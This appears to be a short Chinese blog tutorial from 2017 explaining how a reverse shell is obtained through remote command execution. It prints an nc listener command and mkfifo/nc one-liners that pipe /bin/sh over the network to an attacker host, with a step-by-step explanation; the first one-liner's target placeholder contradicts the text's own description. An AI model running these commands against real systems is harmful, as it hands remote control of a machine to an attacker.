---
title: 通过远程命令执行反弹shell
categories: technology
tags: [web安全,shell,远程命令执行,nc,linux]
date: 2017-05-19 10:40:33
---

## 通过shell命令模拟反弹shell的攻击过程

其中attcker_machine是攻击者的机器，也是最终shell反弹的目标机器。meat_machine是一台受攻击的肉鸡，是shell被反弹的机器。

```shell
# {attacker_machine_ip} 监听2333端口
nc -l -p 2333 -v 
# 反弹shell至{meat_machine_ip} 2333端口
rm /tmp/bd;mkfifo /tmp/bd;cat /tmp/bd | /bin/sh -i 2>&1 | nc {meat_machine_ip} 2333 >/tmp/bd
# 不从stderr传给stdout
rm /tmp/bd;mkfifo /tmp/bd;cat /tmp/bd | /bin/sh -i >&1 | nc {attacker_machine_ip} 2333 > /tmp/bd
```

mkfifo 是创建一个先进先出的文件，整个流程如下：

1. 先在受害机器上创建了一个先进先出的文件bd
2. nc连接控制机，接受控制机的输入，传给bd这个文件
3. cat 将bd文件内容传给/bin/sh 执行
4. `2>&1`是将stderr传给stdout，然后重定向给nc
5. nc通过网络将结果传给了控制机

